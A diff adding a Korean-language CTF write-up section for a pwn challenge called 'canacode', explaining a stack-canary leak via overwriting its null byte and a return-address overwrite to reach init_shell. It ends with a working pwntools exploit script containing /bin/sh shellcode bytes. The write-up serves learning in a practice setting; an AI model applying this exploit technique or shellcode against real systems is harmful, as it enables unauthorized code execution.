@@ -142,3 +142,84 @@ scanf하여 입력받은 문자열을 assembly_calc에 인자로 넘겨주어 �
 
 ![flag](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/flag.PNG?raw=true)
 
+# canacode
+
+마지막이다. 문제 확인부터..
+
+![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/problem.PNG?raw=true)
+
+흠.. 일단 다운받아서 실행해보자.   
+
+![play](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/play.PNG?raw=true)
+
+2번의 출력, 1번의 입력, 아까 풀었던 canary와 매우 유사하다! 그렇다면 main을 확인해보자.  
+
+![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20main.PNG?raw=true)
+
+전체적인 구조는 canary와 유사하다. 차이점은 canary가 수동이 아닌 보호기법으로서 걸려있다는 것.  
+
+![cmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/cmp.PNG?raw=true)
+
+그리고 rbp-0x30의 데이터와 0x4020b5를 비교한다는 것이다. 0x4020b5가 뭘까?  
+
+![str](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/str.PNG?raw=true)
+
+단순한 대답이다. 이제 canary만 알아내면 ret 변조가 가능하다! 이는 첫 read를 이용해서 출력할 것이다.  
+
+![fscan](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/fscan.PNG?raw=true)
+
+코드를 보면 rbp-0x40에서 입력을 받는데, canary는 rbp-0x8에 위치해있다.  
+즉, 둘 사이에 0x38만큼의 차이가 존재하며 그 다음에 canary가 존재한다는 것이다.  
+canary는 가장 첫 8bits가 0으로 채워져 있다. 이는 기존 문자열과의 혼동을 방지하기 위해서인데,  
+이를 임의의 문자로 채워주는 것으로 출력할 때, canary도 같이 출력하게 할 수 있다.  
+즉, A를 0x38만큼 입력하고 B를 입력해주면 canary의 첫 1byte가 B로 바뀌면서 같이 출력될 것이다.  
+
+![canary](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/canary.PNG?raw=true)
+
+성공! 이제 ret를 변조하면 된다. 필자가 목표로 해야하는 지점은 init_shell 함수,  
+시작 주소를 찾아보자!!  
+
+![shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/shell.PNG?raw=true)
+
+![pd shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20shell.PNG?raw=true)
+
+이렇게 시작주소를 알아냈으니 이를 little endian으로 ret에 위치에 넣어주면?  
+다음과 같이 init_shell 함수가 실행되는 것을 확인할 수 있다.  
+(init_shell이 실행되면 
+
+![inshell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell.PNG?raw=true)
+
+![inshell2](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell2.PNG?raw=true)
+
+필자의 페이로드도 같이 남겨두겠다!  
+
+```Python3
+from pwn import *
+import tty
+context.log_level='debug'
+
+
+r = process('./canacode')
+gdb.attach(r)
+
+r.recvuntil('name?')
+r.send("A"*0x38+"B")
+tmp = r.recvuntil('AB')
+tmp = r.recvline()
+tmp1 = tmp[0:7]
+
+r.recvuntil('[Yes/No]')
+
+ans = 0x5965734141414141
+pad = 0x4141414141414141
+shell1 = 0x31f648bb2f62696e
+shell2 = 0x2f2f73685653545f
+shell3 = 0x6a3b5831d20f0500
+ret = 0x00000000004011f3
+
+pay = p64(ans, endian='big') + p64(shell1, endian='big') + p64(shell2, endian='big') + p64(shell3, endian='big') +p64(pad) + b'\x00' + tmp1 + p64(pad) + p64(ret)
+
+r.send(pay)
+
+r.interactive()
+```
